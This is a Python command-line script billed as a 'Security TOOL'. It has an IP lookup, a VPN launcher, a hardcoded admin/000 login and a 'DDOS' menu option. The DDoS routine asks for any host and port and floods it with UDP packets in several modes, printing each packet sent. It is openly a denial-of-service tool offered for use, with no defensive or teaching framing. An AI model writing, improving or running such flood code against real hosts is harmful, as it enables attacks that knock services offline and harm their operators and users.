import os
import requests
import time
import socket
import threading
from datetime import datetime

def getCurrentTime():
   return datetime.now().strftime("%H:%M:%S")

# Colors [ANSI FORMAT]
RED = "\033[31m"
GREEN = "\033[32m"
BLUE = "\033[34m"
RESET = "\033[0m"


# Varablen
isLoggedIn = False
lastIP = "unknown"
author = "M0#Y       "
normalTypeSpeed = 0.03
fastTypeSpeed = 0.0003

prefix = "SENDING DDOS "



# =========== CLEAR CONSOLE ===========
def clear():
    os.system("cls" if os.name == "nt" else "clear")



# =========== HEADER ===========
def header(title):
    status = "LOGGED IN  " if isLoggedIn else "NO LOGIN   "
    type_text(RED + f"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          
╔════════════════════════════╗
║        {title}║
╠════════════════════════════╣
║   Status: {status}      ║
║   Author: {author}      ║
╚════════════════════════════╝
""" + RESET,0.0003)



# =========== TYPE EFFECT ===========
def type_text(text,typSpeed):
    # Geht jeden Buchstaben durch
    for char in text:
        # Keinen Zeilenumbruch und sofort anzeigen
        print(char, end="", flush=True)
        # Mini Delay für den Tipp Effekt
        time.sleep(typSpeed)
    print()

# =========== LOCAL (PUBLIC) IP ===========
def getIP():
    global lastIP
    try:
        lastIP = requests.get("https://api.ipify.org", timeout=3).text
    except:
        lastIP = "unknown"

# =========== START VPN ===========
def startVPN():
    if isLoggedIn:
        try:
            os.startfile(r"C:\Program Files\Proton\VPN\ProtonVPN.Launcher.exe")
            type_text(GREEN + "VPN started" + RESET,normalTypeSpeed)
        except:
            type_text("VPN not found",normalTypeSpeed)
    else:
        type_text("Not logged in",normalTypeSpeed)




# =========== LOGIN ===========
def login():
    global isLoggedIn
    
    clear()
    header("Login")

    username = input("User: ")
    password = input("Pass: ")

    if username == "admin" and password == "000":
        
        isLoggedIn = True

        clear()
        header("Login")

        type_text(RESET + "Succsessfully logged in as " +username + RESET,normalTypeSpeed)
    else:
        type_text("Wrong login",normalTypeSpeed)
    
loops = 100000
def send_packages(amplifiaer):
    try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        s.connect((str(host), int(port)))
        for i in range(loops): 
            s.send(b"\x99" * amplifiaer)

            # formatted string literal
            print(f"{RESET}[{getCurrentTime()}] {BLUE}INFO:{RED} SENDING PACKAGE [#{i}] {amplifiaer}")
            
        input("Finished ...")
    except: 
        return s.close()

def attack_HQ():
    global host,port,method
    header("DDOS")
    host = input("host: ")
    port = input("port: ")
    method = input("method: ")

    if method == "FLOOD":
        type_text("Starting ATTACK (FLOOD)",normalTypeSpeed)
        for sequence in range(loops):
            threading.Thread(target=send_packages(375), daemon=True).start()
    if method == "Power":
        for sequence in range(loops):
            threading.Thread(target=send_packages(750), daemon=True).start()
    if method == "Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packages(375), daemon=True).start()
            threading.Thread(target=send_packages(750), daemon=True).start()


# =========== MAIN MENU ===========
def menu():
    global lastIP

    while True:
        clear()
        header("Security TOOL       ")

        print("IP:", lastIP)
        type_text("\n1. Refresh IP",normalTypeSpeed)
        type_text("2. Start VPN",normalTypeSpeed)
        type_text("3. Login",normalTypeSpeed)
        type_text("4. DDOS",normalTypeSpeed)
        type_text("5. Exit",normalTypeSpeed)

        choice = input("\nSelect: ")

        if choice == "1":
            getIP()

        elif choice == "2":
            startVPN()
            input("Press ENTER")

        elif choice == "3":
            login()
            input("Press ENTER")
        
        elif choice == "4":   
            clear()
            attack_HQ()
            input("Fertig PRESS CLOSE")

        elif choice == "5":
            break
menu()

